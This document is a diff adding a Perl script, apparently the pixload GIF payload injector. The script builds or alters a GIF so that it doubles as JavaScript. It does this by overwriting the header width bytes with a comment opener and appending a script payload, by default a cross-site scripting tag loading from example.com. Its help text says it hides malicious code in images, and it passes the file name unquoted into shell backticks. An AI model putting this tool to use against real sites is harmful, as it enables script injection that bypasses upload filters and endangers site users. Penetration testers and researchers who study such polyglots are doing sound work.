@@ -1,0 +1,143 @@
+#!/usr/bin/env perl
+#
+# GIF Payload Creator/Injector
+#
+# coded by sighook <alexandr.savca89@gmail.com>
+# credits to Marco Ramilli <https://marcoramilli.com>
+#
+# See LICENSE file for copyright and license details.
+#
+
+use strict;
+use warnings;
+
+use feature 'say';
+
+use POSIX;
+use Getopt::Long qw(:config no_ignore_case);
+use File::Basename;
+
+use constant PROGRAM => basename $0;
+use constant VERSION => '@VERSION@';
+
+use GD;
+
+# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
+#                              Default Options                                #
+# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
+
+my %opts = (
+    pixelwidth      => 32,
+    pixelheight     => 32,
+    payload         => '<script src=//example.com></script>',
+);
+
+# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
+#                                Subroutines                                  #
+# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
+
+sub create_gif {
+    say "[>] Generating output file";
+
+    my $img = GD::Image->new(
+        $opts{pixelwidth},
+        $opts{pixelheight},
+        # set 1 to TrueColor (24 bits of color data), default is 8-bit palette
+        1,
+    );
+
+    my $color = $img->colorAllocate(0, 0, 0);
+
+    $img->setPixel(0, 0, $color);
+
+    sysopen my $fh, $opts{FILE}, O_CREAT|O_WRONLY;
+    syswrite   $fh, $img->gif;
+    close      $fh;
+
+    say "[✔] File saved to: $opts{FILE}\n";
+}
+
+sub inject_payload {
+    say "[>] Injecting payload into $opts{FILE}";
+
+    sysopen my $fh, $opts{FILE}, O_WRONLY;
+    sysseek    $fh, 6, SEEK_SET;
+
+    syswrite   $fh, "\x2f\x2a";
+    sysseek    $fh, 0, SEEK_END;
+
+    syswrite   $fh, "\x2a\x2f\x3d\x31\x3b";
+    syswrite   $fh, $opts{payload};
+    syswrite   $fh, "\x3b";
+
+    close      $fh;
+
+    say "[✔] Payload was injected successfully\n";
+}
+
+sub banner {
+    <<EOF;
+...... GIF Payload Creator/Injector ......
+..........................................
+... https://github.com/sighook/pixload ...
+..........................................
+EOF
+}
+
+sub usage {
+    <<"EOF";
+Usage: @{[ PROGRAM ]} [OPTION]... FILE
+Hide payload/malicious code in GIF images.
+
+Mandatory arguments to long options are mandatory for short options too.
+  -W, --pixelwidth  INTEGER   (has no effect)
+                              set pixel width for the new image (default: 10799)
+  -H, --pixelheight INTEGER   set pixel height for the new image (default: 32)
+  -P, --payload     STRING    set payload for injection
+  -v, --version               print version and exit
+  -h, --help                  print help and exit
+
+The option -W, --pixelwidth has no effect since @{[ PROGRAM ]} rewrites
+pixel width bytes with "/*" characters, to prepare the polyglot gif image.
+
+If the output FILE already exists, then the payload will be injected into this
+existing file. Otherwise, the new one will be created with specified pixels
+wide.
+EOF
+}
+
+sub version {
+    PROGRAM . " " . VERSION;
+}
+
+sub main {
+    # command-line options
+    GetOptions(
+        'h|help!'           =>  \$opts{help},
+        'v|version!'        =>  \$opts{version},
+        'P|payload=s'       =>  \$opts{payload},
+        'W|pixelwidth=i'    =>  \$opts{pixelwidth},
+        'H|pixelheight=i'   =>  \$opts{pixelheight},
+    ) or die "$!\n";
+
+    $opts{FILE} = shift @ARGV;
+
+    say &usage    and  exit(0)  if   $opts{help};
+    say &version  and  exit(0)  if   $opts{version};
+    say &usage    and  exit(1)  if ! $opts{FILE};
+
+    say &banner;
+
+    &create_gif if ! -f $opts{FILE};
+    &inject_payload;
+
+    if    (-f '/usr/bin/file'   ) { say `file       $opts{FILE}` }
+
+    if    (-f '/usr/bin/hexdump') { say `hexdump -C $opts{FILE}` }
+    elsif (-f '/usr/bin/xxd'    ) { say `xxd        $opts{FILE}` }
+}
+
+&main;
+
+# vim:sw=4:ts=4:sts=4:et:cc=80
+# End of file.
